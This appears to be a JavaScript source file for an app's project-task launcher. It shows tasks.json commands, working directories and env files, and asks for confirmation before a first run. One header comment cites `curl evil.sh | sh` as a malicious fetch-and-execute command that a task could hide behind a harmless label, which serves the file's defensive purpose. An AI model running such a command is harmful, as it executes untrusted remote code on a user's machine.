// Compact .vscode/tasks.json launcher and retained task log terminals.
// Project data is hydrated before sidebar rendering; task processes themselves
// live in the main process so renderer reloads can reattach to their output.
//
// Ported from upstream d4a51aa. What changed, and why:
//
//   (a) Every row shows the RESOLVED command line, its working directory and
//       its env file -- not just task.label and task.detail. Both of those are
//       free text written by whoever wrote the repo's tasks.json, so upstream's
//       menu could render a row reading "Build (compiles the project)" for a
//       task whose command is `curl evil.sh | sh`. The command line is the only
//       field on the row that the user can act on.
//
//   (b) A row whose env file was refused (resolved outside the project root)
//       renders that refusal in place of its detail and cannot be run.
//
//   (c) The first run of a (project, label) opens a confirmation dialog listing
//       every command the run will spawn, including a compound's dependencies.
//       The answer is remembered against a fingerprint of what runs, so the
//       same label asks again once its command, cwd or env changes.
//
// FORK NOTES -- three globals upstream's copy calls unconditionally do not
// exist in this fork, so each is guarded rather than assumed:
//   * hideViewerPanels()            -- absent here (no such function in public/).
//   * pathBasename()                -- absent here; taskPathBasename is local.
//   * #terminal-restart-task-btn    -- the harvest's own note said this was
//     absent from index.html. It is NOT: index.html:106 carries it, hidden, and
//     names updateTaskHeader/leaveTaskLogView as the pair that toggles it. The
//     optional chaining on its listener is kept as a cheap guard, but the note
//     was wrong and is corrected here rather than left to mislead.
// #terminal-stop-btn DOES exist and already has a listener at app.js:802. Two
// handlers on one button is sound ONLY because each is guarded by its own mode
// flag -- app.js's by `activeSessionId`, this file's by `activeTaskView` -- and
// only while those flags are mutually exclusive. showTaskLog clears
// activeSessionId via setActiveSession(null); showSession clears activeTaskView
// via leaveTaskLogView() (terminal-manager.js:788). Both halves are required:
// while leaveTaskLogView was uncalled, one click did both things.

const taskLogViews = new Map();
let activeTaskView = null;
let openTaskPopover = null;
// Every folder's tasks by path, including folders that only a project knows
// about (attached folders and project roots with no sessions of their own).
// The Projects tab builds its combined task menu from this.
const tasksByPath = new Map();

function taskViewKey(projectPath, label) {
  return `${projectPath}\0${label}`;
}

// Local, not a global named pathBasename: this fork has no such helper, and
// claiming that name would collide with anyone who later adds one.
function taskPathBasename(value) {
  if (!value) return '';
  const parts = String(value).split(/[\\/]/).filter(Boolean);
  return parts[parts.length - 1] || String(value);
}

function findProject(projectPath) {
  for (const projects of [cachedProjects, cachedAllProjects]) {
    const project = projects.find(item => item.projectPath === projectPath);
    if (project) return project;
  }
  const entry = tasksByPath.get(projectPath);
  if (entry) return { projectPath, tasks: entry.tasks, taskError: entry.error, hasTaskFile: entry.hasTaskFile };
  return null;
}

async function hydrateProjectTasks(projectLists, extraPaths = []) {
  const projects = projectLists.flat();
  const paths = [...new Set([...projects.map(project => project.projectPath), ...extraPaths])];
  if (!paths.length) return;
  let results;
  try { results = await window.api.listTasksForProjects(paths); } catch { return; }
  for (const p of paths) {
    const result = results[p] || { tasks: [], error: null, hasTaskFile: false };
    tasksByPath.set(p, { tasks: result.tasks || [], error: result.error || null, hasTaskFile: !!result.hasTaskFile });
  }
  for (const project of projects) {
    const result = results[project.projectPath] || { tasks: [], error: null, hasTaskFile: false };
    project.tasks = result.tasks || [];
    project.taskError = result.error || null;
    project.hasTaskFile = !!result.hasTaskFile;
  }
}

function runningTaskCount(project) {
  return (project?.tasks || []).filter(task => task.run?.running).length;
}

function createProjectTaskButton(project, worktree = false) {
  const button = document.createElement('button');
  button.className = `project-task-btn${worktree ? ' worktree-task-btn' : ''}`;
  button.dataset.projectPath = project.projectPath;
  // A project's button spans several folders; remember them so a change in any
  // one of them refreshes the badge (updateProjectTaskButtons).
  if (Array.isArray(project.projectPaths)) button.dataset.projectPaths = project.projectPaths.join('\n');
  button.title = project.taskError ? 'Task file has an error' : 'Run project task';
  button.innerHTML = `
    <svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M4 2.8a1 1 0 0 1 1.52-.85l8 5.2a1 1 0 0 1 0 1.7l-8 5.2A1 1 0 0 1 4 13.2V2.8Z"/></svg>
    <span class="project-task-count"></span>`;
  updateTaskButton(button, project);
  return button;
}

function updateTaskButton(button, project) {
  const count = runningTaskCount(project);
  button.classList.toggle('running', count > 0);
  button.classList.toggle('error', !!project?.taskError);
  const badge = button.querySelector('.project-task-count');
  if (badge) {
    badge.textContent = count ? String(count) : '';
    badge.style.display = count ? '' : 'none';
  }
  button.title = project?.taskError
    ? project.taskError
    : (count
      ? `${count} task${count === 1 ? '' : 's'} running`
      : (project?.hasTaskFile ? 'Run project task' : 'Set up project tasks'));
}

function updateProjectTaskButtons(projectPath) {
  const project = findProject(projectPath);
  document.querySelectorAll('.project-task-btn').forEach(button => {
    if (button.dataset.projectPaths) {
      // Projects tab: the button is a union over several folders.
      if (!button.dataset.projectPaths.split('\n').includes(projectPath)) return;
      if (typeof findTreeProject !== 'function' || typeof taskPseudoProject !== 'function') return;
      const node = findTreeProject(button.dataset.projectId);
      if (node) updateTaskButton(button, taskPseudoProject(node));
      return;
    }
    if (button.dataset.projectPath === projectPath) updateTaskButton(button, project);
  });
  if (typeof updateProjectTaskIndicators === 'function') updateProjectTaskIndicators(projectPath);
}

function closeTaskPopover() {
  openTaskPopover?.element.remove();
  openTaskPopover = null;
}

function taskStateText(run) {
  if (!run) return '';
  if (run.state === 'running') return 'Running';
  if (run.state === 'failed') return run.exitCode == null ? 'Failed' : `Failed (${run.exitCode})`;
  if (run.state === 'exited') return run.exitCode == null ? 'Finished' : `Exited ${run.exitCode}`;
  if (run.state === 'stopped') return 'Stopped';
  return '';
}

// -- (a) showing what actually runs ---------------------------------------

// A cwd inside the project is shown relative and short; one outside is shown
// in full, because "this runs somewhere else on your disk" is the part worth
// reading. Never truncated by us -- CSS ellipsis would hide the tail, which is
// where a path like /Users/you/.ssh gets interesting.
function describeTaskCwd(cwd, projectPath) {
  if (!cwd) return { text: '', outside: false };
  if (!projectPath) return { text: cwd, outside: false };
  const normalize = value => String(value).replace(/[\\/]+$/, '').replace(/\\/g, '/');
  const root = normalize(projectPath);
  const target = normalize(cwd);
  const lowerRoot = root.toLowerCase();
  const lowerTarget = target.toLowerCase();
  if (lowerTarget === lowerRoot) return { text: '.', outside: false };
  if (lowerTarget.startsWith(`${lowerRoot}/`)) return { text: `./${target.slice(root.length + 1)}`, outside: false };
  return { text: cwd, outside: true };
}

function describeTaskEnvFile(envFile) {
  if (!envFile) return null;
  if (envFile.status === 'rejected') {
    return { className: 'rejected', text: envFile.error || `env file ${envFile.declared} was refused`, title: envFile.error || '' };
  }
  const names = envFile.keys || [];
  const shown = names.slice(0, 6).join(', ');
  const more = names.length > 6 ? `, +${names.length - 6} more` : '';
  return {
    className: 'loaded',
    text: `envFile ${envFile.resolved}${names.length ? ` -> ${shown}${more}` : ' (no variables)'}`,
    title: `${envFile.resolved}\n${names.join('\n')}`,
  };
}

// The block every row and the confirmation dialog share. textContent only:
// every string here comes out of a tasks.json somebody else wrote.
function appendResolvedFacts(container, task, projectPath) {
  if (task.commandLine) {
    const command = document.createElement('code');
    command.className = 'task-row-command';
    command.textContent = task.commandLine;
    command.title = task.commandLine;
    container.appendChild(command);
  }
  const meta = document.createElement('span');
  meta.className = 'task-row-meta';
  const cwd = describeTaskCwd(task.cwd, projectPath);
  if (cwd.text) {
    const cwdEl = document.createElement('span');
    cwdEl.className = `task-row-cwd${cwd.outside ? ' outside' : ''}`;
    cwdEl.textContent = cwd.outside ? `cwd (outside project): ${cwd.text}` : `cwd: ${cwd.text}`;
    cwdEl.title = task.cwd || '';
    meta.appendChild(cwdEl);
  }
  const envFile = describeTaskEnvFile(task.envFile);
  if (envFile) {
    const envEl = document.createElement('span');
    envEl.className = `task-row-envfile ${envFile.className}`;
    envEl.textContent = envFile.text;
    envEl.title = envFile.title;
    meta.appendChild(envEl);
  }
  // Inline env from tasks.json that did not come from the env file.
  const inlineKeys = (task.envKeys || []).filter(key => !(task.envFile?.keys || []).includes(key));
  if (inlineKeys.length) {
    const envEl = document.createElement('span');
    envEl.className = 'task-row-env';
    envEl.textContent = `env: ${inlineKeys.join(', ')}`;
    envEl.title = inlineKeys.join('\n');
    meta.appendChild(envEl);
  }
  if (meta.childNodes.length) container.appendChild(meta);
}

// -- (c) first-run confirmation -------------------------------------------

// Resolves true when the user allows the run. The dialog is the only place the
// whole graph is visible at once, which is the point for a compound: "dev" may
// look harmless and launch four other commands.
function confirmTaskRun(projectPath, confirmation) {
  return new Promise(resolve => {
    const overlay = document.createElement('div');
    overlay.className = 'task-confirm-overlay';
    const dialog = document.createElement('div');
    dialog.className = 'task-confirm-dialog';
    overlay.appendChild(dialog);

    const heading = document.createElement('h3');
    heading.textContent = 'Run this project task?';
    dialog.appendChild(heading);

    const hint = document.createElement('div');
    hint.className = 'task-confirm-hint';
    hint.textContent = 'These commands come from this project’s .vscode/tasks.json, which is part of the repository. Review what will run before allowing it.';
    dialog.appendChild(hint);

    const where = document.createElement('div');
    where.className = 'task-confirm-where';
    where.textContent = projectPath;
    where.title = projectPath;
    dialog.appendChild(where);

    const steps = confirmation.steps || [];
    const list = document.createElement('div');
    list.className = 'task-confirm-steps';
    if (!steps.length) {
      const empty = document.createElement('div');
      empty.className = 'task-confirm-step';
      empty.textContent = 'This task spawns no commands of its own.';
      list.appendChild(empty);
    }
    for (const step of steps) {
      const item = document.createElement('div');
      item.className = 'task-confirm-step';
      const name = document.createElement('span');
      name.className = 'task-confirm-step-label';
      name.textContent = steps.length > 1 ? `${step.label} (${step.type})` : step.type;
      item.appendChild(name);
      appendResolvedFacts(item, step, projectPath);
      list.appendChild(item);
    }
    dialog.appendChild(list);

    if (confirmation.error) {
      const error = document.createElement('div');
      error.className = 'task-confirm-error';
      error.textContent = confirmation.error;
      dialog.appendChild(error);
    }

    const actions = document.createElement('div');
    actions.className = 'task-confirm-actions';
    const cancel = document.createElement('button');
    cancel.className = 'task-confirm-cancel-btn';
    cancel.textContent = 'Cancel';
    const allow = document.createElement('button');
    allow.className = 'task-confirm-allow-btn';
    allow.textContent = 'Run task';
    actions.append(cancel, allow);
    dialog.appendChild(actions);

    const remember = document.createElement('div');
    remember.className = 'task-confirm-remember';
    remember.textContent = 'Allowing is remembered for this task until its command, working directory or environment changes.';
    dialog.appendChild(remember);

    function close(result) {
      overlay.remove();
      document.removeEventListener('keydown', onKey, true);
      resolve(result);
    }
    function onKey(event) {
      if (event.key === 'Escape') { event.stopPropagation(); close(false); }
    }
    cancel.addEventListener('click', () => close(false));
    allow.addEventListener('click', () => close(true));
    overlay.addEventListener('pointerdown', event => { if (event.target === overlay) close(false); });
    document.addEventListener('keydown', onKey, true);
    document.body.appendChild(overlay);
    // Cancel is focused, not Run: a stray Enter must not authorize a command.
    cancel.focus();
  });
}

function renderTaskPopover(project, popover) {
  // The popover scrolls, and every task state change rebuilds it. Keep the
  // offset so starting a task near the bottom does not jump to the top.
  const scrollTop = popover.scrollTop;
  popover.replaceChildren();
  const header = document.createElement('div');
  header.className = 'task-popover-header';
  const headerLabel = document.createElement('span');
  headerLabel.textContent = project.taskError ? 'Task configuration error' : 'Project tasks';
  header.appendChild(headerLabel);
  const runningCount = runningTaskCount(project);
  if (!project.taskError && runningCount > 0) {
    const stopAllButton = document.createElement('button');
    stopAllButton.className = 'task-popover-stop-all';
    stopAllButton.title = `Stop all ${runningCount} running task${runningCount === 1 ? '' : 's'}`;
    stopAllButton.innerHTML = '<svg width="9" height="9" viewBox="0 0 12 12" fill="currentColor"><rect x="2" y="2" width="8" height="8" rx="1"/></svg><span>Stop all</span>';
    stopAllButton.addEventListener('click', async event => {
      event.stopPropagation();
      stopAllButton.disabled = true;
      for (const p of project.projectPaths || [project.projectPath]) {
        await window.api.stopAllTasks(p);
      }
    });
    header.appendChild(stopAllButton);
  }
  popover.appendChild(header);

  if (project.taskError) {
    const error = document.createElement('div');
    error.className = 'task-popover-error';
    error.textContent = project.taskError;
    popover.appendChild(error);
    return;
  }

  if (!(project.tasks || []).length) {
    const empty = document.createElement('div');
    empty.className = 'task-popover-empty';
    empty.textContent = project.hasTaskFile
      ? 'No tasks are configured in .vscode/tasks.json.'
      : 'Create a .vscode/tasks.json to get started.';
    popover.appendChild(empty);
    return;
  }

  let lastGroup = null;
  for (const task of project.tasks || []) {
    // A project's menu combines several folders; each task remembers its own.
    const taskPath = task.projectPath || project.projectPath;
    const source = task.taskSource;
    if ((task.groupLabel || source?.inherited) && taskPath !== lastGroup) {
      const group = document.createElement('div');
      group.className = 'task-popover-group';
      group.textContent = task.groupLabel || taskPathBasename(taskPath);
      if (source?.inherited) {
        const inherited = document.createElement('div');
        inherited.className = 'task-popover-inherited';
        inherited.textContent = `Inherited from ${taskPathBasename(source.parentPath)}`;
        inherited.title = source.filePath;
        group.appendChild(inherited);
      }
      popover.appendChild(group);
      lastGroup = taskPath;
    }
    const row = document.createElement('div');
    row.className = 'task-popover-row';
    row.classList.toggle('unsupported', task.supported === false);
    row.classList.toggle('unconfirmed', task.supported !== false && !task.trusted);
    row.setAttribute('role', 'button');
    row.tabIndex = task.supported === false ? -1 : 0;
    row.dataset.taskLabel = task.label;

    const copy = document.createElement('span');
    copy.className = 'task-row-copy';
    const name = document.createElement('span');
    name.className = 'task-row-name';
    name.textContent = task.label;
    if (task.supported !== false && !task.trusted) {
      const badge = document.createElement('span');
      badge.className = 'task-row-unconfirmed';
      badge.textContent = 'needs confirmation';
      badge.title = 'This task has not been run from Switchboard yet, or its command changed. Running it will ask first.';
      name.appendChild(badge);
    }
    const detail = document.createElement('span');
    const failed = task.run?.state === 'failed';
    detail.className = 'task-row-detail' + (failed ? ' task-row-error' : '');
    // task.detail is authored in the repo's tasks.json and is shown only as a
    // caption. The command line below it is the field that is load-bearing.
    detail.textContent = failed
      ? (task.run.error || (task.run.exitCode != null ? `Task exited with code ${task.run.exitCode}.` : 'Task failed.'))
      : (task.error || task.detail || (task.type === 'compound' ? 'Compound task' : task.type));
    copy.append(name, detail);
    // (a)/(b): the resolved command line, cwd and env file, on every row.
    appendResolvedFacts(copy, task, taskPath);
    if (task.type === 'compound' && task.dependsOn?.length) {
      const chain = document.createElement('span');
      chain.className = 'task-row-meta';
      const chainEl = document.createElement('span');
      chainEl.className = 'task-row-dependson';
      chainEl.textContent = `runs: ${task.dependsOn.join(task.dependsOrder === 'sequence' ? ' -> ' : ', ')}`;
      chain.appendChild(chainEl);
      copy.appendChild(chain);
    }
    if (failed) {
      const viewLog = document.createElement('button');
      viewLog.type = 'button';
      viewLog.className = 'task-row-log';
      viewLog.textContent = 'View log';
      viewLog.setAttribute('aria-label', `View log for ${task.label}`);
      viewLog.addEventListener('click', async event => {
        event.stopPropagation();
        closeTaskPopover();
        await showTaskLog(taskPath, task.label);
      });
      copy.appendChild(viewLog);
    }

    const state = document.createElement('span');
    state.className = `task-row-state ${task.run?.state || ''}`;
    state.textContent = taskStateText(task.run);
    const action = document.createElement('button');
    action.className = `task-row-action${task.run?.running ? ' stop' : ''}`;
    action.title = task.run?.running ? `Stop ${task.label}` : `${failed ? 'Retry' : 'Run'} ${task.label}`;
    action.innerHTML = task.run?.running
      ? '<svg width="10" height="10" viewBox="0 0 12 12" fill="currentColor"><rect x="2" y="2" width="8" height="8" rx="1"/></svg>'
      : '<svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M4 2.8a1 1 0 0 1 1.52-.85l8 5.2a1 1 0 0 1 0 1.7l-8 5.2A1 1 0 0 1 4 13.2V2.8Z"/></svg>';
    action.disabled = task.supported === false;
    action.addEventListener('click', async event => {
      event.stopPropagation();
      // Start, restart and stop all keep the menu open: the row's state
      // column is the feedback. The log is a click on the name away.
      if (task.run?.running) {
        await window.api.stopTask(taskPath, task.label);
      } else if (task.run) {
        await restartProjectTask(taskPath, task.label, { showLog: false });
      } else {
        await runProjectTask(taskPath, task.label, { showLog: false });
      }
    });
    row.append(copy, state);
    if (task.run?.running) {
      // A running server gets restart beside stop, the same pair as the log header.
      const restart = document.createElement('button');
      restart.className = 'task-row-action restart';
      restart.title = `Restart ${task.label}`;
      restart.innerHTML = '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 11a8.1 8.1 0 1 0 2 5.3"/><path d="M20 4v7h-7"/></svg>';
      restart.addEventListener('click', async event => {
        event.stopPropagation();
        restart.disabled = true;
        await restartProjectTask(taskPath, task.label, { showLog: false });
      });
      row.appendChild(restart);
    }
    row.appendChild(action);

    row.addEventListener('click', async () => {
      if (task.supported === false) return;
      if (task.run) {
        closeTaskPopover();
        await showTaskLog(taskPath, task.label);
      } else {
        await runProjectTask(taskPath, task.label, { showLog: false });
      }
    });
    popover.appendChild(row);
  }
  popover.scrollTop = scrollTop;
}

function showTaskPopover(project, anchor) {
  closeTaskPopover();
  const popover = document.createElement('div');
  popover.className = 'task-popover';
  document.body.appendChild(popover);
  renderTaskPopover(project, popover);

  const rect = anchor.getBoundingClientRect();
  // Wider than upstream's 320: the resolved command line is the reason this
  // menu exists, and a command wrapped into four lines is not reviewable.
  const width = Math.min(460, window.innerWidth - 16);
  popover.style.width = `${width}px`;
  const left = Math.max(8, Math.min(rect.right - width, window.innerWidth - width - 8));
  let top = rect.bottom + 6;
  if (top + popover.offsetHeight > window.innerHeight - 8) top = Math.max(8, rect.top - popover.offsetHeight - 6);
  popover.style.left = `${left}px`;
  popover.style.top = `${top}px`;
  openTaskPopover = {
    projectPath: project.projectPath, element: popover, anchor,
    projectPaths: project.projectPaths || null, projectId: project.id || null,
  };
  setTimeout(() => document.addEventListener('pointerdown', dismissTaskPopover, { once: true }), 0);
}

function dismissTaskPopover(event) {
  if (openTaskPopover?.element.contains(event.target) || openTaskPopover?.anchor.contains(event.target)) {
    document.addEventListener('pointerdown', dismissTaskPopover, { once: true });
    return;
  }
  closeTaskPopover();
}

function createTaskLogView(projectPath, label) {
  const key = taskViewKey(projectPath, label);
  if (taskLogViews.has(key)) return taskLogViews.get(key);

  const container = document.createElement('div');
  container.className = 'terminal-container task-log-container';
  terminalsEl.appendChild(container);
  const terminal = new Terminal({
    fontSize: 12,
    fontFamily: "'SF Mono', 'Fira Code', 'Cascadia Code', Menlo, monospace",
    theme: TERMINAL_THEME,
    cursorBlink: false,
    scrollback: 10000,
    convertEol: true,
    // FORK, DO NOT "CLEAN UP": this is not a Windows-pty hint, it is how 6b843eb
    // turns xterm's scrollback reflow OFF, and it is required on EVERY Terminal
    // this fork constructs -- this is the second one. With reflow on, a column
    // change re-wraps existing scrollback in place and rewrites text that was
    // already correct (see the long note at terminal-manager.js:469-495 for the
    // mechanism and for why 'winpty' is the only value with this effect). Task
    // output is exactly the shape that triggers it: long tool output, hard
    // newlines, lines landing on the column limit. And its column count does
    // change while a log is retained: the window-resize listener at the foot of
    // this file refits it, and so does every showTaskLog. (Unlike a session
    // entry it has no ResizeObserver and file-panel.js's refitActiveTerminal
    // skips it -- it only walks openSessions -- so it refits LESS often, not
    // never.) One column change over a full scrollback is all reflow needs, so
    // without this the bug 6b843eb fixed simply comes back for task logs.
    // Cost, same as there: old scrollback keeps the wrapping it was written
    // with. One further effect, shared with the session terminal and checked
    // rather than assumed: xterm's Buffer.resize treats a defined windowsPty as
    // "Windows mode", so growing the row count appends blank lines at the
    // bottom instead of pulling rows back out of scrollback. Same as the
    // session pane -- which is the point; the two should not diverge.
    windowsPty: { backend: 'winpty', buildNumber: 26200 },
    allowProposedApi: true,
    macOptionClickForcesSelection: true,
  });
  const fitAddon = new FitAddon.FitAddon();
  terminal.loadAddon(fitAddon);
  terminal.loadAddon(new WebLinksAddon.WebLinksAddon((_event, url) => window.api.openExternal(url)));
  terminal.loadAddon(new UnicodeGraphemesAddon.UnicodeGraphemesAddon());
  terminal.unicode.activeVersion = '15';
  terminal.open(container);
  container.style.backgroundColor = TERMINAL_THEME.background;
  // Same GPU renderer the session terminals use -- and therefore the same
  // damage-tracking miss db188d1 fixed: after a burst of output WebGL can leave
  // a row painted with stale content while the buffer underneath is correct.
  // db188d1 wired the cure into the SESSION write path only
  // (terminal-manager.js:329, inside flushTerminalBuffer's write callback), and
  // task output does not go through that path -- it arrives on onTaskOutput
  // below. So the settled repaint is wired there and after the retained-output
  // replay in showTaskLog; forceRepaint on becoming visible already comes free
  // via fitTaskLog -> fitAndScroll (terminal-manager.js:271).
  try {
    const webglAddon = new WebglAddon.WebglAddon();
    webglAddon.onContextLoss(() => webglAddon.dispose());
    terminal.loadAddon(webglAddon);
  } catch {}

  terminal.onData(data => window.api.sendTaskInput(projectPath, label, data));
  terminal.onResize(({ cols, rows }) => window.api.resizeTask(projectPath, label, cols, rows));
  const entry = {
    key, projectPath, label, terminal, fitAddon, element: container,
    loading: false, outputMirror: '', queued: [],
  };
  taskLogViews.set(key, entry);
  return entry;
}

// FORK: upstream's fitTaskLog reads proposeDimensions() and applies it (with
// fitAddon.fit() as its fallback). This fork forbids exactly that outside
// terminal-manager.js, and test/fit-single-path.test.js enforces it: the raw
// proposal overshoots for .terminal-container, which is measured from the
// border box while overflow:hidden clips at it, so the last row lands as a
// half-height sliver. safeFit() clamps to the rows actually visible, and
// fitAndScroll() is its rAF wrapper. A task log is a .terminal-container like
// any other, so it gets the same treatment rather than its own sizing path.
function fitTaskLog(entry) {
  try {
    fitAndScroll(entry);
  } catch {}
}

// FORK: db188d1's settled repaint, applied to the task-log terminal.
//
// scheduleSettledRepaint() coalesces -- a still-streaming log pushes the timer
// out and pays nothing, a settled one pays exactly one full-buffer refresh --
// so calling it per write is the intended usage, not a per-chunk cost.
//
// Gated on "is this the log currently on screen", mirroring the session path's
// `sessionId !== activeSessionId` guard at terminal-manager.js:328: repainting
// a task log nobody is looking at buys nothing, and showTaskLog schedules one
// itself when a background log is brought forward.
//
// scheduleSettledRepaint is a top-level declaration in terminal-manager.js
// (index.html:153, loaded before this file), so it is a plain global here. It
// is guarded the way this file guards every cross-script global it does not
// own, and because it is reached from an IPC listener that must not throw.
//
// Note on teardown: terminal-manager clears _repaintTimer in
// teardownSessionView() so a queued refresh cannot land on a disposed
// terminal. Task log terminals are never disposed -- nothing removes an entry
// from taskLogViews -- so there is no matching call to make here. If a task log
// ever gains a teardown path, it must clear entry._repaintTimer.
function repaintTaskLogWhenSettled(entry) {
  if (!entry || !activeTaskView) return;
  if (entry.projectPath !== activeTaskView.projectPath || entry.label !== activeTaskView.label) return;
  if (typeof scheduleSettledRepaint === 'function') scheduleSettledRepaint(entry);
}

function updateTaskHeader(run) {
  if (!activeTaskView || !run) return;
  if (run.projectPath !== activeTaskView.projectPath || run.label !== activeTaskView.label) return;
  terminalHeaderStatus.className = run.running ? 'running' : (run.state === 'failed' ? 'failed' : 'stopped');
  terminalHeaderStatus.textContent = taskStateText(run) || 'Ready';
  terminalStopBtn.style.display = run.running ? '' : 'none';
  const restartButton = document.getElementById('terminal-restart-task-btn');
  if (restartButton) restartButton.style.display = '';
}

async function showTaskLog(projectPath, label) {
  const entry = createTaskLogView(projectPath, label);
  activeTaskView = { projectPath, label };
  sessionStorage.setItem('activeTaskView', JSON.stringify(activeTaskView));
  setActiveSession(null);
  document.querySelectorAll('.session-item.active').forEach(item => item.classList.remove('active'));
  document.querySelectorAll('.terminal-container').forEach(element => element.classList.remove('visible'));
  // Inside a project the log opens beside the session pane, not over it.
  // FORK: upstream calls hideViewerPanels() unconditionally; this fork has no
  // such function, so the call is guarded instead of crashing showTaskLog.
  if (typeof hideViewerPanels === 'function') hideViewerPanels();
  else if (typeof hideAllViewers === 'function') hideAllViewers();
  if (typeof onTaskLogShown === 'function') onTaskLogShown();
  placeholder.style.display = 'none';
  gridViewer.style.display = 'none';
  terminalHeader.style.display = '';
  terminalHeaderName.textContent = label;
  terminalHeaderId.textContent = shortProjectPath(projectPath);
  terminalHeaderShell.textContent = 'Task';
  terminalHeaderShell.style.display = '';
  const ptyTitle = document.getElementById('terminal-header-pty-title');
  if (ptyTitle) ptyTitle.style.display = 'none';
  entry.element.classList.add('visible');
  entry.terminal.focus();
  fitTaskLog(entry);

  entry.loading = true;
  entry.queued = [];
  let run = null;
  try {
    run = await window.api.getTaskRun(projectPath, label);
  } catch (error) {
    run = {
      projectPath, label, state: 'failed', running: false,
      output: `\r\n[Could not load retained task output: ${error.message}]\r\n`,
    };
  }
  if (run) {
    const queued = entry.queued.join('');
    let retainedOutput = run.output || '';
    if (queued && !retainedOutput.endsWith(queued)) retainedOutput += queued;
    if (entry.outputMirror !== retainedOutput) {
      entry.terminal.reset();
      // Repaint once this replay settles: fitTaskLog's forceRepaint runs on the
      // next animation frame, which is normally BEFORE the getTaskRun round trip
      // above resolves, so nothing else forces the replayed rows to be painted.
      entry.terminal.write(retainedOutput, () => repaintTaskLogWhenSettled(entry));
      entry.outputMirror = retainedOutput;
    }
  }
  entry.queued = [];
  entry.loading = false;
  updateTaskHeader(run || { projectPath, label, state: 'idle', running: false });
}

// The exit from the task-log view, and the only thing that undoes what
// showTaskLog set. Leaving activeTaskView set is not cosmetic:
//
//   * #terminal-stop-btn carries TWO click handlers -- app.js:802's session one
//     and this file's task one -- and each is guarded only by its own mode
//     flag. That is sound only while the flags are mutually exclusive. A stale
//     activeTaskView breaks that: one click then stops the task AND opens the
//     "Stop this session?" prompt.
//   * applyTaskRun -> updateTaskHeader would keep writing a task's status into
//     the header of whatever session is on screen.
//   * the resize listener at the foot of this file keeps refitting a pane
//     nobody is looking at.
//   * the persisted key would survive the reload, so restoreActiveTaskView
//     (once something calls it) would reopen the log in a window that has no
//     active session.
//
// The container is hidden here rather than left to the caller: showSession
// clears `.visible` on its single-view branch only, so in grid view the task
// log would stay painted over the cards.
//
// Called from showSession (terminal-manager.js:788) -- the path a user takes
// out of a task log. It is NOT yet called from grid-view.js's showGridView, nor
// from the plan/stats/memory/settings viewers, which also take the task log off
// screen; those files are outside this change.
function leaveTaskLogView() {
  const previous = activeTaskView;
  activeTaskView = null;
  sessionStorage.removeItem('activeTaskView');
  const restartButton = document.getElementById('terminal-restart-task-btn');
  if (restartButton) restartButton.style.display = 'none';
  if (!previous) return;
  const entry = taskLogViews.get(taskViewKey(previous.projectPath, previous.label));
  if (entry) entry.element.classList.remove('visible');
}

// (c) The one place a task is allowed through the gate. Both runProjectTask and
// restartProjectTask funnel here, so neither can start something unconfirmed.
async function withTaskConfirmation(projectPath, label, invoke) {
  let run = await invoke({});
  if (run?.needsConfirmation) {
    const confirmation = run.confirmation || { steps: [] };
    const allowed = await confirmTaskRun(projectPath, confirmation);
    if (!allowed) return null;
    run = await invoke({ confirmed: true, fingerprint: confirmation.fingerprint });
    // The file changed between the dialog and the click: show it again rather
    // than run something that was never on screen.
    if (run?.needsConfirmation) {
      const again = await confirmTaskRun(projectPath, run.confirmation || { steps: [] });
      if (!again) return null;
      run = await invoke({ confirmed: true, fingerprint: run.confirmation?.fingerprint });
      if (run?.needsConfirmation) return null;
    }
  }
  return run;
}

async function runProjectTask(projectPath, label, { showLog = true } = {}) {
  const run = await withTaskConfirmation(projectPath, label, opts =>
    window.api.startTask(projectPath, label, opts));
  if (!run) return;
  applyTaskRun(run);
  if (!showLog) return;
  await showTaskLog(projectPath, label);
  if (run.error && !run.running) {
    const entry = taskLogViews.get(taskViewKey(projectPath, label));
    if (entry && !(run.output || '').includes(run.error)) entry.terminal.write(`\r\nTask failed: ${run.error}\r\n`);
  }
}

async function restartProjectTask(projectPath, label, { showLog = true } = {}) {
  const entry = taskLogViews.get(taskViewKey(projectPath, label));
  if (entry) {
    entry.terminal.reset();
    entry.outputMirror = '';
    entry.loading = false;
    entry.queued = [];
  }
  const run = await withTaskConfirmation(projectPath, label, opts =>
    window.api.restartTask(projectPath, label, opts));
  if (!run) return;
  applyTaskRun(run);
  if (showLog) await showTaskLog(projectPath, label);
}

function applyTaskRun(run) {
  if (!run?.projectPath || !run.label) return;
  // A confirmation prompt is not a run: writing it onto the row would show a
  // task as idle that may in fact still be running.
  if (run.needsConfirmation) return;
  for (const projects of [cachedProjects, cachedAllProjects]) {
    const project = projects.find(item => item.projectPath === run.projectPath);
    const task = project?.tasks?.find(item => item.label === run.label);
    if (task) task.run = run;
  }
  const byPath = tasksByPath.get(run.projectPath)?.tasks?.find(item => item.label === run.label);
  if (byPath) byPath.run = run;
  updateProjectTaskButtons(run.projectPath);
  updateTaskHeader(run);
  if (openTaskPopover?.projectPaths?.includes(run.projectPath)) {
    const node = typeof findTreeProject === 'function' ? findTreeProject(openTaskPopover.projectId) : null;
    if (node && typeof taskPseudoProject === 'function') renderTaskPopover(taskPseudoProject(node), openTaskPopover.element);
  } else if (openTaskPopover?.projectPath === run.projectPath) {
    const project = findProject(run.projectPath);
    if (project) renderTaskPopover(project, openTaskPopover.element);
  }
}

async function restoreActiveTaskView() {
  if (activeSessionId) return;
  let saved;
  try { saved = JSON.parse(sessionStorage.getItem('activeTaskView') || 'null'); } catch {}
  if (!saved?.projectPath || !saved.label) return;
  const project = findProject(saved.projectPath);
  if (project?.tasks?.some(task => task.label === saved.label)) {
    await showTaskLog(saved.projectPath, saved.label);
  }
}

// FORK: these are the preload entries this file needs (see needsWiring). Until
// preload.js exposes them the listeners simply do not register, rather than
// throwing at script load and taking the rest of the renderer with them.
function registerTaskListener(name, handler) {
  if (typeof window.api?.[name] !== 'function') {
    console.warn(`[task-runner] window.api.${name} is not exposed; task UI is partially wired`);
    return;
  }
  window.api[name](handler);
}

registerTaskListener('onTaskOutput', (projectPath, label, data) => {
  const entry = taskLogViews.get(taskViewKey(projectPath, label));
  if (!entry) return;
  if (entry.loading) entry.queued.push(data);
  else {
    entry.outputMirror += data;
    // The write callback is where db188d1 hangs the settled repaint for
    // sessions; task output never reaches that path, so it is hung here.
    entry.terminal.write(data, () => repaintTaskLogWhenSettled(entry));
  }
});

